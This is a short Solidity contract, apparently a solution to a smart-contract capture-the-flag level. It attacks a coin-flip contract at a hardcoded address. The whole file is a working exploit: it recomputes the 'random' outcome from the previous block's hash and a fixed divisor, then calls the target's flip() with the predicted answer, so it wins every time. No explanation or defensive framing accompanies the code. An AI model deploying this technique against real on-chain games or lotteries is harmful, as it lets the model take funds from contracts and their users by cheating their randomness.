pragma solidity ^0.8.17;
interface Iflip{
function flip(bool a) external returns(bool);
}

pragma solidity ^0.8.17; 

contract flipWinner{
    Iflip interfaceFlip;
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(){
        interfaceFlip = Iflip(0x847b63dECb567161f0C53be219680b69690564d0);
    }
    function win() external {
        uint256 value = uint256(blockhash(block.number-1));
        uint256 coin = value/factor;
        bool side = coin ==1 ? true : false;

        if(side == true){
            interfaceFlip.flip(true);
        }
        else if (side == false){
            interfaceFlip.flip(false);
        }
    }

}